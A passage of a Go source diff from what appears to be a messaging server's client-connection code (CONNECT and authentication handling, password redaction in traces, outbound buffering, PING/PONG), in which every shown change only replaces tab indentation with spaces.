regexp.MustCompile(`\"?\\s*pass\\S*?\"?\\s*[:=]\\s*\"?(([^\",\\r\\n}])*)`)\n // removePassFromTrace removes any notion of passwords from trace\n // messages for logging.\n func removePassFromTrace(arg []byte) []byte {\n-\tif !bytes.Contains(arg, []byte(`pass`)) {\n-\t\treturn arg\n-\t}\n-\t// Take a copy of the connect proto just for the trace message.\n-\tvar _arg [4096]byte\n-\tbuf := append(_arg[:0], arg...)\n-\n-\tm := passPat.FindAllSubmatchIndex(buf, -1)\n-\tif len(m) == 0 {\n-\t\treturn arg\n-\t}\n-\n-\tredactedPass := []byte(\"[REDACTED]\")\n-\tfor _, i := range m {\n-\t\tif len(i) < 4 {\n-\t\t\tcontinue\n-\t\t}\n-\t\tstart := i[2]\n-\t\tend := i[3]\n-\n-\t\t// Replace password substring.\n-\t\tbuf = append(buf[:start], append(redactedPass, buf[end:]...)...)\n-\t\tbreak\n-\t}\n-\treturn buf\n+        if !bytes.Contains(arg, []byte(`pass`)) {\n+                return arg\n+        }\n+        // Take a copy of the connect proto just for the trace message.\n+        var _arg [4096]byte\n+        buf := append(_arg[:0], arg...)\n+\n+        m := passPat.FindAllSubmatchIndex(buf, -1)\n+        if len(m) == 0 {\n+                return arg\n+        }\n+\n+        redactedPass := []byte(\"[REDACTED]\")\n+        for _, i := range m {\n+                if len(i) < 4 {\n+                        continue\n+                }\n+                start := i[2]\n+                end := i[3]\n+\n+                // Replace password substring.\n+                buf = append(buf[:start], append(redactedPass, buf[end:]...)...)\n+                break\n+        }\n+        return buf\n }\n \n // Returns the RTT by computing the elapsed time since now and `start`.\n // On Windows VM where I (IK) run tests, time.Since() will return 0\n // (I suspect some time granularity issues). So return at minimum 1ns.\n func computeRTT(start time.Time) time.Duration {\n-\trtt := time.Since(start)\n-\tif rtt <= 0 {\n-\t\trtt = time.Nanosecond\n-\t}\n-\treturn rtt\n+        rtt := time.Since(start)\n+        if rtt <= 0 {\n+                rtt = time.Nanosecond\n+        }\n+        return rtt\n }\n \n // processConnect will process a client connect op.\n func (c *client) processConnect(arg []byte) error {\n-\tsupportsHeaders := c.srv.supportsHeaders()\n-\tc.mu.Lock()\n-\t// If we can't stop the timer because the callback is in progress...\n-\tif !c.clearAuthTimer() {\n-\t\t// wait for it to finish and handle sending the failure back to\n-\t\t// the client.\n-\t\tfor !c.isClosed() {\n-\t\t\tc.mu.Unlock()\n-\t\t\ttime.Sleep(25 * time.Millisecond)\n-\t\t\tc.mu.Lock()\n-\t\t}\n-\t\tc.mu.Unlock()\n-\t\treturn nil\n-\t}\n-\tc.last = time.Now().UTC()\n-\t// Estimate RTT to start.\n-\tif c.kind == CLIENT {\n-\t\tc.rtt = computeRTT(c.start)\n-\t\tif c.srv != nil {\n-\t\t\tc.clearPingTimer()\n-\t\t\tc.srv.setFirstPingTimer(c)\n-\t\t}\n-\t}\n-\tkind := c.kind\n-\tsrv := c.srv\n-\n-\t// Moved unmarshalling of clients' Options under the lock.\n-\t// The client has already been added to the server map, so it is possible\n-\t// that other routines lookup the client, and access its options under\n-\t// the client's lock, so unmarshalling the options outside of the lock\n-\t// would cause data RACEs.\n-\tif err := json.Unmarshal(arg, &c.opts); err != nil {\n-\t\tc.mu.Unlock()\n-\t\treturn err\n-\t}\n-\t// Indicate that the CONNECT protocol has been received, and that the\n-\t// server now knows which protocol this client supports.\n-\tc.flags.set(connectReceived)\n-\t// Capture these under lock\n-\tc.echo = c.opts.Echo\n-\tproto := c.opts.Protocol\n-\tverbose := c.opts.Verbose\n-\tlang := c.opts.Lang\n-\taccount := c.opts.Account\n-\taccountNew := c.opts.AccountNew\n-\n-\tif c.kind == CLIENT {\n-\t\tvar ncs string\n-\t\tif c.opts.Version != _EMPTY_ {\n-\t\t\tncs = fmt.Sprintf(\"v%s\", c.opts.Version)\n-\t\t}\n-\t\tif c.opts.Lang != _EMPTY_ {\n-\t\t\tif c.opts.Version == _EMPTY_ {\n-\t\t\t\tncs = c.opts.Lang\n-\t\t\t} else {\n-\t\t\t\tncs = fmt.Sprintf(\"%s:%s\", ncs, c.opts.Lang)\n-\t\t\t}\n-\t\t}\n-\t\tif c.opts.Name != _EMPTY_ {\n-\t\t\tif c.opts.Version == _EMPTY_ && c.opts.Lang == _EMPTY_ {\n-\t\t\t\tncs = c.opts.Name\n-\t\t\t} else {\n-\t\t\t\tncs = fmt.Sprintf(\"%s:%s\", ncs, c.opts.Name)\n-\t\t\t}\n-\t\t}\n-\t\tif ncs != _EMPTY_ {\n-\t\t\tc.ncs.Store(fmt.Sprintf(\"%s - %q\", c, ncs))\n-\t\t}\n-\t}\n-\n-\t// If websocket client and JWT not in the CONNECT, use the cookie JWT (possibly empty).\n-\tif ws := c.ws; ws != nil && c.opts.JWT == \"\" {\n-\t\tc.opts.JWT = ws.cookieJwt\n-\t}\n-\t// when not in operator mode, discard the jwt\n-\tif srv != nil && srv.trustedKeys == nil {\n-\t\tc.opts.JWT = _EMPTY_\n-\t}\n-\tujwt := c.opts.JWT\n-\n-\t// For headers both client and server need to support.\n-\tc.headers = supportsHeaders && c.opts.Headers\n-\tc.mu.Unlock()\n-\n-\tif srv != nil {\n-\t\t// Applicable to clients only:\n-\t\t// As soon as c.opts is unmarshalled and if the proto is at\n-\t\t// least ClientProtoInfo, we need to increment the following counter.\n-\t\t// This is decremented when client is removed from the server's\n-\t\t// clients map.\n-\t\tif kind == CLIENT && proto >= ClientProtoInfo {\n-\t\t\tsrv.mu.Lock()\n-\t\t\tsrv.cproto++\n-\t\t\tsrv.mu.Unlock()\n-\t\t}\n-\n-\t\t// Check for Auth\n-\t\tif ok := srv.checkAuthentication(c); !ok {\n-\t\t\t// We may fail here because we reached max limits on an account.\n-\t\t\tif ujwt != _EMPTY_ {\n-\t\t\t\tc.mu.Lock()\n-\t\t\t\tacc := c.acc\n-\t\t\t\tc.mu.Unlock()\n-\t\t\t\tsrv.mu.Lock()\n-\t\t\t\ttooManyAccCons := acc != nil && acc != srv.gacc\n-\t\t\t\tsrv.mu.Unlock()\n-\t\t\t\tif tooManyAccCons {\n-\t\t\t\t\treturn ErrTooManyAccountConnections\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tc.authViolation()\n-\t\t\treturn ErrAuthentication\n-\t\t}\n-\n-\t\t// Check for Account designation, we used to have this as an optional feature for dynamic\n-\t\t// sandbox environments. Now its considered an error.\n-\t\tif accountNew || account != _EMPTY_ {\n-\t\t\tc.authViolation()\n-\t\t\treturn ErrAuthentication\n-\t\t}\n-\n-\t\t// If no account designation.\n-\t\tif c.acc == nil {\n-\t\t\t// By default register with the global account.\n-\t\t\tc.registerWithAccount(srv.globalAccount())\n-\t\t}\n-\t}\n-\n-\tswitch kind {\n-\tcase CLIENT:\n-\t\t// Check client protocol request if it exists.\n-\t\tif proto < ClientProtoZero || proto > ClientProtoInfo {\n-\t\t\tc.sendErr(ErrBadClientProtocol.Error())\n-\t\t\tc.closeConnection(BadClientProtocolVersion)\n-\t\t\treturn ErrBadClientProtocol\n-\t\t}\n-\t\t// Check to see that if no_responders is requested\n-\t\t// they have header support on as well.\n-\t\tc.mu.Lock()\n-\t\tmisMatch := c.opts.NoResponders && !c.headers\n-\t\tc.mu.Unlock()\n-\t\tif misMatch {\n-\t\t\tc.sendErr(ErrNoRespondersRequiresHeaders.Error())\n-\t\t\tc.closeConnection(NoRespondersRequiresHeaders)\n-\t\t\treturn ErrNoRespondersRequiresHeaders\n-\t\t}\n-\t\tif verbose {\n-\t\t\tc.sendOK()\n-\t\t}\n-\tcase ROUTER:\n-\t\t// Delegate the rest of processing to the route\n-\t\treturn c.processRouteConnect(srv, arg, lang)\n-\tcase GATEWAY:\n-\t\t// Delegate the rest of processing to the gateway\n-\t\treturn c.processGatewayConnect(arg)\n-\tcase LEAF:\n-\t\t// Delegate the rest of processing to the leaf node\n-\t\treturn c.processLeafNodeConnect(srv, arg, lang)\n-\t}\n-\treturn nil\n+        supportsHeaders := c.srv.supportsHeaders()\n+        c.mu.Lock()\n+        // If we can't stop the timer because the callback is in progress...\n+        if !c.clearAuthTimer() {\n+                // wait for it to finish and handle sending the failure back to\n+                // the client.\n+                for !c.isClosed() {\n+                        c.mu.Unlock()\n+                        time.Sleep(25 * time.Millisecond)\n+                        c.mu.Lock()\n+                }\n+                c.mu.Unlock()\n+                return nil\n+        }\n+        c.last = time.Now().UTC()\n+        // Estimate RTT to start.\n+        if c.kind == CLIENT {\n+                c.rtt = computeRTT(c.start)\n+                if c.srv != nil {\n+                        c.clearPingTimer()\n+                        c.srv.setFirstPingTimer(c)\n+                }\n+        }\n+        kind := c.kind\n+        srv := c.srv\n+\n+        // Moved unmarshalling of clients' Options under the lock.\n+        // The client has already been added to the server map, so it is possible\n+        // that other routines lookup the client, and access its options under\n+        // the client's lock, so unmarshalling the options outside of the lock\n+        // would cause data RACEs.\n+        if err := json.Unmarshal(arg, &c.opts); err != nil {\n+                c.mu.Unlock()\n+                return err\n+        }\n+        // Indicate that the CONNECT protocol has been received, and that the\n+        // server now knows which protocol this client supports.\n+        c.flags.set(connectReceived)\n+        // Capture these under lock\n+        c.echo = c.opts.Echo\n+        proto := c.opts.Protocol\n+        verbose := c.opts.Verbose\n+        lang := c.opts.Lang\n+        account := c.opts.Account\n+        accountNew := c.opts.AccountNew\n+\n+        if c.kind == CLIENT {\n+                var ncs string\n+                if c.opts.Version != _EMPTY_ {\n+                        ncs = fmt.Sprintf(\"v%s\", c.opts.Version)\n+                }\n+                if c.opts.Lang != _EMPTY_ {\n+                        if c.opts.Version == _EMPTY_ {\n+                                ncs = c.opts.Lang\n+                        } else {\n+                                ncs = fmt.Sprintf(\"%s:%s\", ncs, c.opts.Lang)\n+                        }\n+                }\n+                if c.opts.Name != _EMPTY_ {\n+                        if c.opts.Version == _EMPTY_ && c.opts.Lang == _EMPTY_ {\n+                                ncs = c.opts.Name\n+                        } else {\n+                                ncs = fmt.Sprintf(\"%s:%s\", ncs, c.opts.Name)\n+                        }\n+                }\n+                if ncs != _EMPTY_ {\n+                        c.ncs.Store(fmt.Sprintf(\"%s - %q\", c, ncs))\n+                }\n+        }\n+\n+        // If websocket client and JWT not in the CONNECT, use the cookie JWT (possibly empty).\n+        if ws := c.ws; ws != nil && c.opts.JWT == \"\" {\n+                c.opts.JWT = ws.cookieJwt\n+        }\n+        // when not in operator mode, discard the jwt\n+        if srv != nil && srv.trustedKeys == nil {\n+                c.opts.JWT = _EMPTY_\n+        }\n+        ujwt := c.opts.JWT\n+\n+        // For headers both client and server need to support.\n+        c.headers = supportsHeaders && c.opts.Headers\n+        c.mu.Unlock()\n+\n+        if srv != nil {\n+                // Applicable to clients only:\n+                // As soon as c.opts is unmarshalled and if the proto is at\n+                // least ClientProtoInfo, we need to increment the following counter.\n+                // This is decremented when client is removed from the server's\n+                // clients map.\n+                if kind == CLIENT && proto >= ClientProtoInfo {\n+                        srv.mu.Lock()\n+                        srv.cproto++\n+                        srv.mu.Unlock()\n+                }\n+\n+                // Check for Auth\n+                if ok := srv.checkAuthentication(c); !ok {\n+                        // We may fail here because we reached max limits on an account.\n+                        if ujwt != _EMPTY_ {\n+                                c.mu.Lock()\n+                                acc := c.acc\n+                                c.mu.Unlock()\n+                                srv.mu.Lock()\n+                                tooManyAccCons := acc != nil && acc != srv.gacc\n+                                srv.mu.Unlock()\n+                                if tooManyAccCons {\n+                                        return ErrTooManyAccountConnections\n+                                }\n+                        }\n+                        c.authViolation()\n+                        return ErrAuthentication\n+                }\n+\n+                // Check for Account designation, we used to have this as an optional feature for dynamic\n+                // sandbox environments. Now its considered an error.\n+                if accountNew || account != _EMPTY_ {\n+                        c.authViolation()\n+                        return ErrAuthentication\n+                }\n+\n+                // If no account designation.\n+                if c.acc == nil {\n+                        // By default register with the global account.\n+                        c.registerWithAccount(srv.globalAccount())\n+                }\n+        }\n+\n+        switch kind {\n+        case CLIENT:\n+                // Check client protocol request if it exists.\n+                if proto < ClientProtoZero || proto > ClientProtoInfo {\n+                        c.sendErr(ErrBadClientProtocol.Error())\n+                        c.closeConnection(BadClientProtocolVersion)\n+                        return ErrBadClientProtocol\n+                }\n+                // Check to see that if no_responders is requested\n+                // they have header support on as well.\n+                c.mu.Lock()\n+                misMatch := c.opts.NoResponders && !c.headers\n+                c.mu.Unlock()\n+                if misMatch {\n+                        c.sendErr(ErrNoRespondersRequiresHeaders.Error())\n+                        c.closeConnection(NoRespondersRequiresHeaders)\n+                        return ErrNoRespondersRequiresHeaders\n+                }\n+                if verbose {\n+                        c.sendOK()\n+                }\n+        case ROUTER:\n+                // Delegate the rest of processing to the route\n+                return c.processRouteConnect(srv, arg, lang)\n+        case GATEWAY:\n+                // Delegate the rest of processing to the gateway\n+                return c.processGatewayConnect(arg)\n+        case LEAF:\n+                // Delegate the rest of processing to the leaf node\n+                return c.processLeafNodeConnect(srv, arg, lang)\n+        }\n+        return nil\n }\n \n+\n+\n func (c *client) sendErrAndErr(err string) {\n-\tc.sendErr(err)\n-\tc.Errorf(err)\n+        c.sendErr(err)\n+        c.Errorf(err)\n }\n \n func (c *client) sendErrAndDebug(err string) {\n-\tc.sendErr(err)\n-\tc.Debugf(err)\n+        c.sendErr(err)\n+        c.Debugf(err)\n }\n \n func (c *client) authTimeout() {\n-\tc.sendErrAndDebug(\"Authentication Timeout\")\n-\tc.closeConnection(AuthenticationTimeout)\n+        c.sendErrAndDebug(\"Authentication Timeout\")\n+        c.closeConnection(AuthenticationTimeout)\n }\n \n func (c *client) authExpired() {\n-\tc.sendErrAndDebug(\"User Authentication Expired\")\n-\tc.closeConnection(AuthenticationExpired)\n+        c.sendErrAndDebug(\"User Authentication Expired\")\n+        c.closeConnection(AuthenticationExpired)\n }\n \n func (c *client) accountAuthExpired() {\n-\tc.sendErrAndDebug(\"Account Authentication Expired\")\n-\tc.closeConnection(AuthenticationExpired)\n+        c.sendErrAndDebug(\"Account Authentication Expired\")\n+        c.closeConnection(AuthenticationExpired)\n }\n \n func (c *client) authViolation() {\n-\tvar s *Server\n-\tvar hasTrustedNkeys, hasNkeys, hasUsers bool\n-\tif s = c.srv; s != nil {\n-\t\ts.mu.Lock()\n-\t\thasTrustedNkeys = s.trustedKeys != nil\n-\t\thasNkeys = s.nkeys != nil\n-\t\thasUsers = s.users != nil\n-\t\ts.mu.Unlock()\n-\t\tdefer s.sendAuthErrorEvent(c)\n-\n-\t}\n-\tif hasTrustedNkeys {\n-\t\tc.Errorf(\"%v\", ErrAuthentication)\n-\t} else if hasNkeys {\n-\t\tc.Errorf(\"%s - Nkey %q\",\n-\t\t\tErrAuthentication.Error(),\n-\t\t\tc.opts.Nkey)\n-\t} else if hasUsers {\n-\t\tc.Errorf(\"%s - User %q\",\n-\t\t\tErrAuthentication.Error(),\n-\t\t\tc.opts.Username)\n-\t} else {\n-\t\tc.Errorf(ErrAuthentication.Error())\n-\t}\n-\tif c.isMqtt() {\n-\t\tc.mqttEnqueueConnAck(mqttConnAckRCNotAuthorized, false)\n-\t} else {\n-\t\tc.sendErr(\"Authorization Violation\")\n-\t}\n-\tc.closeConnection(AuthenticationViolation)\n+        var s *Server\n+        var hasTrustedNkeys, hasNkeys, hasUsers bool\n+        if s = c.srv; s != nil {\n+                s.mu.Lock()\n+                hasTrustedNkeys = s.trustedKeys != nil\n+                hasNkeys = s.nkeys != nil\n+                hasUsers = s.users != nil\n+                s.mu.Unlock()\n+                defer s.sendAuthErrorEvent(c)\n+\n+        }\n+        if hasTrustedNkeys {\n+                c.Errorf(\"%v\", ErrAuthentication)\n+        } else if hasNkeys {\n+                c.Errorf(\"%s - Nkey %q\",\n+                        ErrAuthentication.Error(),\n+                        c.opts.Nkey)\n+        } else if hasUsers {\n+                c.Errorf(\"%s - User %q\",\n+                        ErrAuthentication.Error(),\n+                        c.opts.Username)\n+        } else {\n+                c.Errorf(ErrAuthentication.Error())\n+        }\n+        if c.isMqtt() {\n+                c.mqttEnqueueConnAck(mqttConnAckRCNotAuthorized, false)\n+        } else {\n+                c.sendErr(\"Authorization Violation\")\n+        }\n+        c.closeConnection(AuthenticationViolation)\n }\n \n func (c *client) maxAccountConnExceeded() {\n-\tc.sendErrAndErr(ErrTooManyAccountConnections.Error())\n-\tc.closeConnection(MaxAccountConnectionsExceeded)\n+        c.sendErrAndErr(ErrTooManyAccountConnections.Error())\n+        c.closeConnection(MaxAccountConnectionsExceeded)\n }\n \n func (c *client) maxConnExceeded() {\n-\tc.sendErrAndErr(ErrTooManyConnections.Error())\n-\tc.closeConnection(MaxConnectionsExceeded)\n+        c.sendErrAndErr(ErrTooManyConnections.Error())\n+        c.closeConnection(MaxConnectionsExceeded)\n }\n \n func (c *client) maxSubsExceeded() {\n-\tif c.acc.shouldLogMaxSubErr() {\n-\t\tc.Errorf(ErrTooManySubs.Error())\n-\t}\n-\tc.sendErr(ErrTooManySubs.Error())\n+        if c.acc.shouldLogMaxSubErr() {\n+                c.Errorf(ErrTooManySubs.Error())\n+        }\n+        c.sendErr(ErrTooManySubs.Error())\n }\n \n func (c *client) maxPayloadViolation(sz int, max int32) {\n-\tc.Errorf(\"%s: %d vs %d\", ErrMaxPayload.Error(), sz, max)\n-\tc.sendErr(\"Maximum Payload Violation\")\n-\tc.closeConnection(MaxPayloadExceeded)\n+        c.Errorf(\"%s: %d vs %d\", ErrMaxPayload.Error(), sz, max)\n+        c.sendErr(\"Maximum Payload Violation\")\n+        c.closeConnection(MaxPayloadExceeded)\n }\n \n // queueOutbound queues data for a clientconnection.\n // Lock should be held.\n func (c *client) queueOutbound(data []byte) {\n-\t// Do not keep going if closed\n-\tif c.isClosed() {\n-\t\treturn\n-\t}\n-\n-\t// Add to pending bytes total.\n-\tc.out.pb += int64(len(data))\n-\n-\t// Check for slow consumer via pending bytes limit.\n-\t// ok to return here, client is going away.\n-\tif c.kind == CLIENT && c.out.pb > c.out.mp {\n-\t\t// Perf wise, it looks like it is faster to optimistically add than\n-\t\t// checking current pb+len(data) and then add to pb.\n-\t\tc.out.pb -= int64(len(data))\n-\t\tatomic.AddInt64(&c.srv.slowConsumers, 1)\n-\t\tc.Noticef(\"Slow Consumer Detected: MaxPending of %d Exceeded\", c.out.mp)\n-\t\tc.markConnAsClosed(SlowConsumerPendingBytes)\n-\t\treturn\n-\t}\n-\n-\tif c.out.p == nil && len(data) < maxBufSize {\n-\t\tif c.out.sz == 0 {\n-\t\t\tc.out.sz = startBufSize\n-\t\t}\n-\t\tif c.out.s != nil && cap(c.out.s) >= int(c.out.sz) {\n-\t\t\tc.out.p = c.out.s\n-\t\t\tc.out.s = nil\n-\t\t} else {\n-\t\t\t// FIXME(dlc) - make power of 2 if less than maxBufSize?\n-\t\t\tc.out.p = make([]byte, 0, c.out.sz)\n-\t\t}\n-\t}\n-\t// Determine if we copy or reference\n-\tavailable := cap(c.out.p) - len(c.out.p)\n-\tif len(data) > available {\n-\t\t// We can't fit everything into existing primary, but message will\n-\t\t// fit in next one we allocate or utilize from the secondary.\n-\t\t// So copy what we can.\n-\t\tif available > 0 && len(data) < int(c.out.sz) {\n-\t\t\tc.out.p = append(c.out.p, data[:available]...)\n-\t\t\tdata = data[available:]\n-\t\t}\n-\t\t// Put the primary on the nb if it has a payload\n-\t\tif len(c.out.p) > 0 {\n-\t\t\tc.out.nb = append(c.out.nb, c.out.p)\n-\t\t\tc.out.p = nil\n-\t\t}\n-\t\t// TODO: It was found with LeafNode and Websocket that referencing\n-\t\t// the data buffer when > maxBufSize would cause corruption\n-\t\t// (reproduced with small maxBufSize=10 and TestLeafNodeWSNoBufferCorruption).\n-\t\t// So always make a copy for now.\n-\n-\t\t// We will copy to primary.\n-\t\tif c.out.p == nil {\n-\t\t\t// Grow here\n-\t\t\tif (c.out.sz << 1) <= maxBufSize {\n-\t\t\t\tc.out.sz <<= 1\n-\t\t\t}\n-\t\t\tif len(data) > int(c.out.sz) {\n-\t\t\t\tc.out.p = make([]byte, 0, len(data))\n-\t\t\t} else {\n-\t\t\t\tif c.out.s != nil && cap(c.out.s) >= int(c.out.sz) { // TODO(dlc) - Size mismatch?\n-\t\t\t\t\tc.out.p = c.out.s\n-\t\t\t\t\tc.out.s = nil\n-\t\t\t\t} else {\n-\t\t\t\t\tc.out.p = make([]byte, 0, c.out.sz)\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\tc.out.p = append(c.out.p, data...)\n-\n-\t// Check here if we should create a stall channel if we are falling behind.\n-\t// We do this here since if we wait for consumer's writeLoop it could be\n-\t// too late with large number of fan in producers.\n-\tif c.out.pb > c.out.mp/2 && c.out.stc == nil {\n-\t\tc.out.stc = make(chan struct{})\n-\t}\n+        // Do not keep going if closed\n+        if c.isClosed() {\n+                return\n+        }\n+\n+        // Add to pending bytes total.\n+        c.out.pb += int64(len(data))\n+\n+        // Check for slow consumer via pending bytes limit.\n+        // ok to return here, client is going away.\n+        if c.kind == CLIENT && c.out.pb > c.out.mp {\n+                // Perf wise, it looks like it is faster to optimistically add than\n+                // checking current pb+len(data) and then add to pb.\n+                c.out.pb -= int64(len(data))\n+                atomic.AddInt64(&c.srv.slowConsumers, 1)\n+                c.Noticef(\"Slow Consumer Detected: MaxPending of %d Exceeded\", c.out.mp)\n+                c.markConnAsClosed(SlowConsumerPendingBytes)\n+                return\n+        }\n+\n+        if c.out.p == nil && len(data) < maxBufSize {\n+                if c.out.sz == 0 {\n+                        c.out.sz = startBufSize\n+                }\n+                if c.out.s != nil && cap(c.out.s) >= int(c.out.sz) {\n+                        c.out.p = c.out.s\n+                        c.out.s = nil\n+                } else {\n+                        // FIXME(dlc) - make power of 2 if less than maxBufSize?\n+                        c.out.p = make([]byte, 0, c.out.sz)\n+                }\n+        }\n+        // Determine if we copy or reference\n+        available := cap(c.out.p) - len(c.out.p)\n+        if len(data) > available {\n+                // We can't fit everything into existing primary, but message will\n+                // fit in next one we allocate or utilize from the secondary.\n+                // So copy what we can.\n+                if available > 0 && len(data) < int(c.out.sz) {\n+                        c.out.p = append(c.out.p, data[:available]...)\n+                        data = data[available:]\n+                }\n+                // Put the primary on the nb if it has a payload\n+                if len(c.out.p) > 0 {\n+                        c.out.nb = append(c.out.nb, c.out.p)\n+                        c.out.p = nil\n+                }\n+                // TODO: It was found with LeafNode and Websocket that referencing\n+                // the data buffer when > maxBufSize would cause corruption\n+                // (reproduced with small maxBufSize=10 and TestLeafNodeWSNoBufferCorruption).\n+                // So always make a copy for now.\n+\n+                // We will copy to primary.\n+                if c.out.p == nil {\n+                        // Grow here\n+                        if (c.out.sz << 1) <= maxBufSize {\n+                                c.out.sz <<= 1\n+                        }\n+                        if len(data) > int(c.out.sz) {\n+                                c.out.p = make([]byte, 0, len(data))\n+                        } else {\n+                                if c.out.s != nil && cap(c.out.s) >= int(c.out.sz) { // TODO(dlc) - Size mismatch?\n+                                        c.out.p = c.out.s\n+                                        c.out.s = nil\n+                                } else {\n+                                        c.out.p = make([]byte, 0, c.out.sz)\n+                                }\n+                        }\n+                }\n+        }\n+        c.out.p = append(c.out.p, data...)\n+\n+        // Check here if we should create a stall channel if we are falling behind.\n+        // We do this here since if we wait for consumer's writeLoop it could be\n+        // too late with large number of fan in producers.\n+        if c.out.pb > c.out.mp/2 && c.out.stc == nil {\n+                c.out.stc = make(chan struct{})\n+        }\n }\n \n // Assume the lock is held upon entry.\n func (c *client) enqueueProtoAndFlush(proto []byte, doFlush bool) {\n-\tif c.isClosed() {\n-\t\treturn\n-\t}\n-\tc.queueOutbound(proto)\n-\tif !(doFlush && c.flushOutbound()) {\n-\t\tc.flushSignal()\n-\t}\n+        if c.isClosed() {\n+                return\n+        }\n+        c.queueOutbound(proto)\n+        if !(doFlush && c.flushOutbound()) {\n+                c.flushSignal()\n+        }\n }\n \n // Queues and then flushes the connection. This should only be called when\n // the writeLoop cannot be started yet. Use enqueueProto() otherwise.\n // Lock is held on entry.\n func (c *client) sendProtoNow(proto []byte) {\n-\tc.enqueueProtoAndFlush(proto, true)\n+        c.enqueueProtoAndFlush(proto, true)\n }\n \n // Enqueues the given protocol and signal the writeLoop if necessary.\n // Lock is held on entry.\n func (c *client) enqueueProto(proto []byte) {\n-\tc.enqueueProtoAndFlush(proto, false)\n+        c.enqueueProtoAndFlush(proto, false)\n }\n \n // Assume the lock is held upon entry.\n func (c *client) sendPong() {\n-\tif c.trace {\n-\t\tc.traceOutOp(\"PONG\", nil)\n-\t}\n-\tc.enqueueProto([]byte(pongProto))\n+        if c.trace {\n+                c.traceOutOp(\"PONG\", nil)\n+        }\n+        c.enqueueProto([]byte(pongProto))\n }\n \n // Used to kick off a RTT measurement for latency tracking.\n func (c *client) sendRTTPing() bool {\n-\tc.mu.Lock()\n-\tsent := c.sendRTTPingLocked()\n-\tc.mu.Unlock()\n-\treturn sent\n+        c.mu.Lock()\n+        sent := c.sendRTTPingLocked()\n+        c.mu.Unlock()\n+        return sent\n }\n \n // Used to kick off a RTT measurement for latency tracking.\n@@ -2079,824 +2081,824 @@ func (c *client) sendRTTPing() bool {\n // the c.rtt is 0 and wants to force an update by sending a PING.\n // Client lock held on entry.\n func (c *client) sendRTTPingLocked() bool {\n-\tif c.isMqtt() {\n-\t\treturn false\n-\t}\n-\t// Most client libs send a CONNECT+PING and wait for a PONG from the\n-\t// server. So if firstPongSent flag is set, it is ok for server to\n-\t// send the PING. But in case we have client libs that don't do that,\n-\t// allow the send of the PING if more than 2 secs have elapsed since\n-\t// the client TCP connection was accepted.\n-\tif !c.isClosed() &&\n-\t\t(c.flags.isSet(firstPongSent) || time.Since(c.start) > maxNoRTTPingBeforeFirstPong) {\n-\t\tc.sendPing()\n-\t\treturn true\n-\t}\n-\treturn false\n+        if c.isMqtt() {\n+                return false\n+        }\n+        // Most client libs send a CONNECT+PING and wait for a PONG from the\n+        // server. So if firstPongSent flag is set, it is ok for server to\n+        // send the PING. But in case we have client libs that don't do that,\n+        // allow the send of the PING if more than 2 secs have elapsed since\n+        // the client TCP connection was accepted.\n+        if !c.isClosed() &&\n+                (c.flags.isSet(firstPongSent) || time.Since(c.start) > maxNoRTTPingBeforeFirstPong) {\n+                c.sendPing()\n+                return true\n+        }\n+        return false\n }\n \n // Assume the lock is held upon entry.\n func (c *client) sendPing() {\n-\tc.rttStart = time.Now().UTC()\n-\tc.ping.out++\n-\tif c.trace {\n-\t\tc.traceOutOp(\"PING\", nil)\n-\t}\n-\tc.enqueueProto([]byte(pingProto))\n+        c.rttStart = time.Now().UTC()\n+        c.ping.out++\n+        if c.trace {\n+                c.traceOutOp(\"PING\", nil)\n+        }\n+        c.enqueueProto([]byte(pingProto))\n }\n \n // Generates the INFO to be sent to the client with the client ID included.\n // info arg will be copied since passed by value.\n // Assume lock is held.\n func (c *client) generateClientInfoJSON(info Info) []byte {\n-\tinfo.CID = c.cid\n-\tinfo.ClientIP = c.host\n-\tinfo.MaxPayload = c.mpay\n-\tif c.isWebsocket() {\n-\t\tinfo.ClientConnectURLs = info.WSConnectURLs\n-\t}\n-\tinfo.WSConnectURLs = nil\n-\t// Generate the info json\n-\tb, _ := json.Marshal(info)\n-\tpcs := [][]byte{[]byte(\"INFO\"), b, []byte(CR_LF)}\n-\treturn bytes.Join(pcs, []byte(\" \"))\n+        info.CID = c.cid\n+        info.ClientIP = c.host\n+        info.MaxPayload = c.mpay\n+        if c.isWebsocket() {\n+                info.ClientConnectURLs = info.WSConnectURLs\n+        }\n+        info.WSConnectURLs = nil\n+        // Generate the info json\n+        b, _ := json.Marshal(info)\n+        pcs := [][]byte{[]byte(\"INFO\"), b, []byte(CR_LF)}\n+        return bytes.Join(pcs, []byte(\" \"))\n }\n \n func (c *client) sendErr(err string) {\n-\tc.mu.Lock()\n-\tif c.trace {\n-\t\tc.traceOutOp(\"-ERR\", []byte(err))\n-\t}\n-\tif !c.isMqtt() {\n-\t\tc.enqueueProto([]byte(fmt.Sprintf(errProto, err)))\n-\t}\n-\tc.mu.Unlock()\n+        c.mu.Lock()\n+        if c.trace {\n+                c.traceOutOp(\"-ERR\", []byte(err))\n+        }\n+        if !c.isMqtt() {\n+                c.enqueueProto([]byte(fmt.Sprintf(errProto, err)))\n+        }\n+        c.mu.Unlock()\n }\n \n func (c *client) sendOK() {\n-\tc.mu.Lock()\n-\tif c.trace {\n-\t\tc.traceOutOp(\"OK\", nil)\n-\t}\n-\tc.enqueueProto([]byte(okProto))\n-\tc.mu.Unlock()\n+        c.mu.Lock()\n+        if c.trace {\n+                c.traceOutOp(\"OK\", nil)\n+        }\n+        c.enqueueProto([]byte(okProto))\n+        c.mu.Unlock()\n }\n \n func (c *client) processPing() {\n-\tc.mu.Lock()\n-\n-\tif c.isClosed() {\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\n-\tc.sendPong()\n-\n-\t// Record this to suppress us sending one if this\n-\t// is within a given time interval for activity.\n-\tc.ping.last = time.Now()\n-\n-\t// If not a CLIENT, we are done. Also the CONNECT should\n-\t// have been received, but make sure it is so before proceeding\n-\tif c.kind != CLIENT || !c.flags.isSet(connectReceived) {\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\n-\t// If we are here, the CONNECT has been received so we know\n-\t// if this client supports async INFO or not.\n-\tvar (\n-\t\tcheckInfoChange bool\n-\t\tsrv             = c.srv\n-\t)\n-\t// For older clients, just flip the firstPongSent flag if not already\n-\t// set and we are done.\n-\tif c.opts.Protocol < ClientProtoInfo || srv == nil {\n-\t\tc.flags.setIfNotSet(firstPongSent)\n-\t} else {\n-\t\t// This is a client that supports async INFO protocols.\n-\t\t// If this is the first PING (so firstPongSent is not set yet),\n-\t\t// we will need to check if there was a change in cluster topology\n-\t\t// or we have a different max payload. We will send this first before\n-\t\t// pong since most clients do flush after connect 